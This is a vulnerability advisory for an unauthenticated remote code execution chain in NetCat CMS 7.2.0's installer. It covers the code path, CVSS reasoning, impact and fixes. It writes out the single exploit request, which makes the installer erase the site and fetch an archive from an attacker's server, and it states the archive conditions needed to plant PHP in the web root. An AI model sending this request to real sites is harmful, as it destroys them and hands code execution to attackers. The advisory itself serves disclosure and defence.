# NetCat CMS / NetCat E-Commerce 7.2.0 (build 26228) - Unauthenticated Remote Code Execution Through the Installer's Restore-From-URL Archive Handling

Advisory: https://0day-rubbish.com/blog/installer-remote-archive-rce
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com

## Summary

NetCat CMS (also distributed as NetCat E-Commerce) is a content-management and storefront platform whose
distribution ships an interactive installer under the `install/` directory of the web root. That installer
is a single large dispatcher script, `install/index.php` - 4,149 lines in the analyzed distribution, file
md5 `e7331402fa104de8a03efd7d933790ca` - organised as a switch over an integer `action` parameter. One arm of
that switch implements the product's restore-from-archive feature: it accepts a URL in the `backup_address`
parameter, fetches a NetCat backup archive from that URL, unpacks it, and moves the unpacked entries into the
installation directory. The arm is reached directly, by a `goto` at `install/index.php:411-416`, whenever a
request carries `backup_address` - before any credential, session, licence or installation-state check.

That arm is anonymous. A grep of the entire arm, lines 769 to 934, for `session`, `$_SESSION`, `auth`,
`token`, `permission` and `nc_auth` returns zero hits, while the same pattern set has 84 hits elsewhere in
the same file, which is the positive control for the empty result. No cookie, no login, no CSRF token, no
database, no licence key and no previously completed installation is required. On a pristine, uninstalled
instance an unauthenticated attacker can therefore make the product do four things in one request: erase the
existing site, fetch a file of the attacker's choosing from the attacker's own HTTP server, unpack it, and
copy the archive's top-level entries into the document root under their original names.

The copy is the core primitive. At `install/index.php:908-912` the installer strips only the `.` and `..`
entries produced by `scandir()`, then loops over what remains and calls
`rename($cur_dir . '/' . $file, NETCAT_FOLDER . $file)`. There is no `basename()` call, no extension
allowlist, no path validation, and no signature or origin check on the archive. `NETCAT_FOLDER` is defined at
`install/index.php:35` as the document root whenever the standalone-script flag is false, which is the case
for the full distribution. Any file name present in the attacker's archive therefore lands in the web root
with its original name, and the product never inspects what that name is.

Execution follows from the web server configuration the product itself ships. The document-root `.htaccess`
is 42 lines, 1,295 bytes, md5 `6841b80d4a859d668c48a1d2f2c9d17e`, and contains no `php_flag engine off`
directive at all - `grep -c 'engine off'` returns 0 - even though it carries two separate PHP configuration
blocks, `<IfModule mod_php7.c>` at lines 13-20 and `<IfModule mod_php.c>` at lines 22-29. The `netcat_files/`
directory, by contrast, ships an `.htaccess` that turns PHP execution off in three separate blocks, for
`mod_php4.c`, `mod_php5.c` and `mod_php7.c`. The vendor demonstrably knows the control and applied it to the
upload directory; the document root was omitted. A `.php` file written into the document root through
`rename()` is consequently executed on first request, and the omission, not a design decision, is what
turns a file-write primitive into remote code execution.

Dynamic verification was end-to-end over HTTP against a copy of the vendor distribution served by Apache 2.4
with mod_php 7.4 inside an isolated sandbox container, not a sink-level replication, not a QEMU appliance
and not a physical appliance. One anonymous POST carrying
`action=42&delfiles=1&demodistr=1&backup_address=http://<fixture>/payload.tgz` returned HTTP 200 with a
42,021-byte body in 0.154 seconds. The fixture HTTP server recorded two inbound requests from the victim -
`HEAD /payload.tgz` and `GET /payload.tgz`, both with no user-agent string, the signature of the product's own
libcurl call rather than a client fetch. A follow-up GET for the planted file returned HTTP 200 with a
108-byte body reading `NC_UNAUTH_RCE_04eed2532453 uid=33 user=www-data host=95ebcd3cdc6f
file=/var/www/html/nc_poc_04eed2532453.php`. The same request was then repeated against a copy of a completed
installation - distinguishable from the distribution by its `vars.inc.php` md5 `ac1cf514a00d5a7c10d717c9198b42df`
against the distribution value `ecf8099161399a559b14502185c6fd21`, its 5,931 files under `netcat/`, and its
still-present 164-file `install/` directory - with the same result. The `install/` directory is not removed by
a normal installation; the product only prints an instruction to delete it.

The privilege actually observed is the web server's own account, `uid=33`, `www-data`, inside the replication
container. No root, no host-level access and no privilege escalation above the web-server user was observed at
any point, and none is claimed.

Six qualifiers belong with every statement of this finding. The victim must be able to make outbound HTTP(S)
requests to the attacker's server. The document root must be writable by the web-server user, which the
product's own installation flow requires. The payload archive must carry at least two top-level entries,
because of a descent loop at `install/index.php:892-898` that hangs on a single file entry. Exploitation
necessarily destroys the site first, because the `delfiles` branch at `install/index.php:811-823` is a required
step on the path and the gate at `install/index.php:826-837` stops the download without it. The target needs
either a system `tar` binary or PHP's `PharData`, since the extraction sink selects between them. And a
successful exploitation is one-shot per host: the successful path falls through into the following arm, whose
`install/index.php:1104-1108` deletes the entire `install/` directory, so a second attempt needs an
administrator to redeploy the distribution.

This is not a default-credential finding, not a session bypass, not a memory-corruption finding, and not a
command-injection finding: the `exec("tar -zxf ...")` call at `install/index.php:3883` interpolates only
server-side constants. It is a chain of three defects - an anonymous installer, a download-and-unpack step with
no integrity or origin verification, and a copy-into-document-root step with no name filtering - closed by a
single missing directive in the web-root configuration. No identifier has been assigned to this finding.

- Component: the installer dispatcher `install/index.php` (4,149 lines, md5 `e7331402fa104de8a03efd7d933790ca`)
  shipped in `netcat-7.2.0.26228.tar.gz`, switch arm `case 42` at line 769, reached by `goto` at lines 411-416
- Sink: `rename($cur_dir . '/' . $file, NETCAT_FOLDER . $file)` at `install/index.php:911`, fed by the
  `scandir()` walk of the unpacked archive at `install/index.php:892-906`
- Source: the `backup_address` request parameter, read through `nc_installer_post_get()` with GET taking
  priority over POST, plus the completely attacker-controlled content of the fetched archive
- Gate: `nc_installer_check_domain()` at `install/index.php:792` (function at line 2853, `CURLOPT_NOBODY`
  probe at line 2858), which admits any `http://` URL that answers a HEAD request and blocks neither private
  addresses nor attacker hosts
- Execution: the document-root `.htaccess` (42 lines, 1,295 bytes, md5
  `6841b80d4a859d668c48a1d2f2c9d17e`) has no `php_flag engine off`, while `netcat_files/.htaccess` has three
- Verification: end-to-end HTTP against a container-hosted copy of the distribution on an isolated sandbox;
  observed identity `uid=33 user=www-data`; no appliance and no elevated account was reached

## CVSS Score

- Score: 9.8 Critical (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- Attack Vector: Network - the installer is an HTTP endpoint of the web root; the attacker needs no position
  beyond the ability to send one request to it
- Attack Complexity: Low - a single POST with four form fields, no race, no heap grooming, no multi-stage
  state machine; the only precondition on the attacker's side is an HTTP server holding the archive
- Privileges Required: None - the arm performs no authentication, and the reader should note that this is
  measured, not inferred: the whole arm returns zero hits for six authentication-related pattern families
- User Interaction: None - nothing is required of an administrator or a site visitor
- Scope: Unchanged - the executed code runs as the web server account inside the product's own web root
- Confidentiality, Integrity, Availability: all High - code execution as the web-server user reaches the
  product's configuration store, and the chain additionally destroys the existing site by design
- CWE: CWE-434 primary (unrestricted upload of a file with a dangerous type); CWE-494 contributing (download
  of code without integrity check, the archive fetch); CWE-306 contributing (missing authentication for a
  critical function, the installer arm itself)
- Published arithmetic: ISS = 1 - (1 - 0.56)^3 = 0.914816; Impact = 6.42 x 0.914816 = 5.873119;
  Exploitability = 8.22 x 0.85 x 0.77 x 0.85 x 0.85 = 3.887043; sum 9.760162, rounded up to 9.8

Privileges Required is None rather than the neighbouring Low tier because the endpoint has no account model to
speak of at the point of entry. The measured evidence is that the `case 42` arm contains no session lookup, no
token comparison, no permission call and no licence check over its entire 769-934 line span, and that the 9.8
request used in verification carried no cookie, no credential and no prior state; the instance had never been
installed. A Low reading would mean the attacker must first hold some account on the product. Nothing in the
record supports that requirement, because a request that holds no account at all is the request that worked, so
the metric is None. The reading is not weakened by the fact that an installed instance also accepts the same
anonymous request; it is the pristine-instance case that settles the metric.

One rejected reading is recorded alongside the headline. Treating the victim's outbound reachability as a strong
precondition - that is, requiring the target to be able to open an outbound connection to an attacker-chosen
host - moves Attack Complexity to High and produces
`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` = 8.1, whose arithmetic is ISS 0.914816, Impact 5.873119,
Exploitability = 8.22 x 0.85 x 0.44 x 0.85 x 0.85 = 2.221167, sum 8.094286, rounded up to 8.1. It is published
here as a labelled alternative rather than as the headline, because a server that cannot make outbound HTTP
requests is already unable to perform the legitimate restore function the feature exists for, and the record
treats an attacker-operated HTTP service as ordinary attacker capability rather than a complication of the
attack.

A second reading is rejected outright. A Low-privilege version of the same impact profile would be
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` = 8.8 (Exploitability = 8.22 x 0.85 x 0.77 x 0.62 x 0.85 =
2.835255, sum 8.708374, rounded up to 8.8). It assumes a lower-privileged principal exists who can reach the
installer arm, and the research found no such principal and no such gate; the effective privilege requirement is
the absence of any credential, which is None, not Low.

## Affected Products

- NetCat CMS / NetCat E-Commerce 7.2.0, build 26228, distribution archive `netcat-7.2.0.26228.tar.gz`; the
  version is self-attested by the package's `install/sql/version.sql`, which records `Patch '720'` and
  `VersionNumber='7.2.0'` with build 26228, so the analyzed code is the current release line and not a
  historical snapshot
- Affected component: `install/index.php` (4,149 lines, md5 `e7331402fa104de8a03efd7d933790ca`), switch arm
  `case 42` at line 769 together with the fall-through into the following arm at lines 935-1128
- Affected configuration: a deployment whose document root is served with PHP execution enabled and whose
  `.htaccess`/server configuration is the one shipped with the distribution, that is, without
  `php_flag engine off` in the document root; a deployment that independently disables PHP execution in the web
  root, or that denies access to `install/` at the web server level, does not expose the execution half of this
  chain
- Prerequisite environment: writable document root for the web-server user, outbound HTTP(S) reachability from
  the victim host, and either a system `tar` or PHP `PharData`
- Not claimed: no other version of NetCat CMS was installed, served or audited during this research, so no other
  version is claimed vulnerable and none is claimed fixed; the sibling products and modules of the platform were
  not in scope; no statement is made about deployments that front the installer with an authenticating reverse
  proxy
- Verification method and its boundary: the finding was established statically from the shipped source files and
  verified end-to-end over HTTP against a copy of the distribution running under Apache 2.4 with mod_php 7.4 in
  an isolated sandbox container. The observed landing identity is that container's web-server account,
  `uid=33 user=www-data`. No physical or virtual appliance was driven, and no observation above the web-server
  account was made. This advisory makes no claim about the identity the same code would run as on a
  vendor-appliance deployment, because that was not measured
- Identifier: no CVE identifier has been assigned to this finding, and none is claimed

## Impact

- Remote code execution as the web-server account on an internet-facing content-management installation, from a
  single unauthenticated request, with no interaction by any administrator, editor or visitor
- Access to the product's own configuration material within the web-server account's readable scope; the
  document root holds `vars.inc.php`, the configuration file the installer manages and names in its own file list
  at `install/index.php:1204-1218`, so whatever that file contains is inside the authority the exploit obtained.
  The record does not enumerate its contents, so no specific secret and no specific downstream system is claimed
- Full control of served content and of any file the web-server account can write in the web root, which for a
  storefront includes the pages, templates and uploaded assets the site serves to its own customers
- Destruction of the existing site as an intrinsic step, not a side effect of clumsiness: the `delfiles` branch
  removes the installation, cache, dump, files, template, trash, `.htaccess`, `index.php` and `vars.inc.php`
  entries named at `install/index.php:1204-1218`, and the verification measured `netcat` 5,925 files to 0,
  `netcat_template` 1,510 to 0, `netcat_files` 14 to 0 and `install` 164 to 0
- Availability loss that survives the attack: the successful path deletes the whole `install/` directory at
  `install/index.php:1104-1108`, and the site content was already erased, so recovery requires restoring from a
  backup that the attacker's `delfiles` step did not touch
- No persistence is claimed. The same fall-through that deletes `install/` makes the chain one-shot per host;
  re-exploitation requires an administrator to redeploy the distribution, and the record measured the deletion
  rather than inferring it
- No lateral movement beyond the web-server account's own authority is claimed; what that account can reach
  depends entirely on the deployment, and the record does not measure a production deployment

## Mitigation / Fix Recommendations

1. Deny access to the installer directory at the web server, and remove it after installation. The distribution
   leaves `install/` in place and only prints an instruction to delete it; a `<Location>` or `.htaccess` denial
   on `install/` closes the anonymous entry point regardless of what the installer code does next
2. Stop accepting an arbitrary URL for the restore source. Restrict `backup_address` to an allowlist of vendor
   or operator domains, require HTTPS, verify a signature or checksum over the fetched archive before it is used,
   and remove the `CURLOPT_SSL_VERIFYPEER=false` setting that the domain probe uses
3. Filter at the copy step, not at the request step. Before the `rename()` at `install/index.php:911`, apply
   `basename()` and an allowlist of expected names, and refuse any entry matching `*.php*`, `*.phtml*`, `*.pht*`
   or `*.phar*`; the caller currently moves whatever `scandir()` returns
4. Disable PHP execution in the document root, and in every directory that can receive files. Add
   `<FilesMatch "\.(php[0-9]?|phtml?|phar)$"> php_flag engine off </FilesMatch>` to the web-root `.htaccess`, and
   extend the existing protection from `netcat_files/.htaccess` to the web root, `netcat/`, `netcat_template/`
   and `netcat/tmp/`; the two PHP `IfModule` blocks already present in the web-root file are the natural place
   for it
5. Require an authenticated administrator session for the restore operation and for the `delfiles` branch, and
   add a confirmation step before any file deletion; an anonymous request that erases a site is not a necessary
   property of a restore feature
6. Replace the `exec("tar -zxf ...")` extraction with an in-process archive reader (`PharData` or `ZipArchive`)
   that validates each member's target path, so that the extraction step cannot write outside the staging
   directory; the current split between system `tar` and `PharData` also means the behaviour differs by host
7. Add CSRF tokens to every installer action and stop resolving parameters with GET precedence, so that a third
   party page cannot drive the installer through an image tag; the installer currently has no token at all
8. For operators who cannot patch immediately: keep the installer directory unreachable from untrusted networks,
   keep the document root non-writable for the web-server user outside the paths the application needs, and
   treat this chain as a reason to verify that the site's own backups are intact and restorable

## References

- https://0day-rubbish.com/blog/installer-remote-archive-rce
- https://github.com/Exploit-Garbage/0day-Rubbish
- https://netcat.ru/ - vendor site, recorded as reachable during the public-record check
- disclosure@0day-rubbish.com

No CVE identifier has been assigned to this finding.

---
Written by the 0day Rubbish Research Team.
